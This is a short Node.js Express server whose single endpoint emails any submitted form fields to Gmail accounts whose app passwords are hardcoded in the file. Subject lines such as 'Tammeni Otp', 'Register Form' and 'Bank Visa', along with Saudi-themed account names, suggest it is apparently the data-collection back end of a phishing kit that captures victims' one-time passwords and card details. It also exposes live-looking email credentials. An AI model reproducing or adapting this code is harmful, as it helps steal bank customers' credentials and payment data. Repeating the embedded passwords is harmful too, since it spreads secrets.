const express=  require('express')
const app = express()
const cors = require('cors')
const nodemailer = require('nodemailer')
const PORT = process.env.PORT || 8080
app.use(express.json())
app.use(cors())

app.get('/',(req,res)=>res.sendStatus(200))
app.post('/email',async(req,res)=>{
    if(req.query.type==='one'){
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'sds.saudia@gmail.com',
                pass: 'enaz rpyz cpzu dvps',
            },
          });
          let htmlContent = '<div>';
          for (const [key, value] of Object.entries(req.body)) {
            htmlContent += `<p>${key}: ${typeof value === 'object' ? JSON.stringify(value)  : value}</p>`;
        }
        await transporter.sendMail({
            from: 'Admin Panel',
            to: 'sds.saudia@gmail.com',
            subject:
             `${req.query.otp ?'Tammeni  Otp' :
                 req.query.reg ? 'Tammeni Register Form ' :
                 req.query.apply ?'Tammeni Apply Form ' :
                 req.query.activate ?'Tammeni Activate Account ' :
                 req.query.new ?'Tammeni  New User ' :
                  'Tammeni Bank Visa'}`,
            html: htmlContent
        }).then(info => {
        if (info.accepted.length) {
            res.sendStatus(200);
        } else {
            res.sendStatus(400);
        }
});
    }else{
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'saudiabsher1990@gmail.com',
                pass: 'idot oooz frhy mdsr',
            },
          });
          let htmlContent = '<div>';
          for (const [key, value] of Object.entries(req.body)) {
            htmlContent += `<p>${key}: ${typeof value === 'object' ? JSON.stringify(value)  : value}</p>`;
        }
        await transporter.sendMail({
            from: 'Admin Panel',
            to: 'saudiabsher1990@gmail.com',
            subject:
             `${req.query.otp ?'Tammeni Bank  Otp' :
                 req.query.reg ? 'Tammeni Register Form ' :
                 req.query.apply ?'Tammeni Apply Form ' :
                 req.query.activate ?'Tammeni Activate Account ' :
                 req.query.new ?'Tammeni  New User ' :
                  'Tammeni Bank Visa'}`,
            html: htmlContent
        }).then(info => {
        if (info.accepted.length) {
            res.sendStatus(200);
        } else {
            res.sendStatus(400);
        }
});
        
    }
})

app.listen(PORT,()=>{
    console.log('server conected')
})